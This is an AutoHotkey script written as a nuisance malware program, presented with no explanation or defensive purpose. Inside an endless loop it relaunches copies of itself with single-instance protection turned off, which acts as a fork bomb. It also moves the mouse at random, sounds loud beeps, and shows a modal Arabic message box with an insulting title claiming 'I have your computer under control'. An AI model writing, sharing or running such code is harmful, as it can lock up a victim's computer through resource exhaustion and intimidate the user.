#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%

#Persistent
#SingleInstance, off

Loop {
	Run, %A_ScriptFullPath%
	Random, xcord, -300, 300
	Random, ycord, -300, 300
	MouseMove, xcord, ycord, 13, R
	SoundBeep, 32766, 1000
	MsgBox, 1310770 , والدتكوالدتك, لدي جهاز الكمبيوتر الخاص بك تحت السيطرة
}
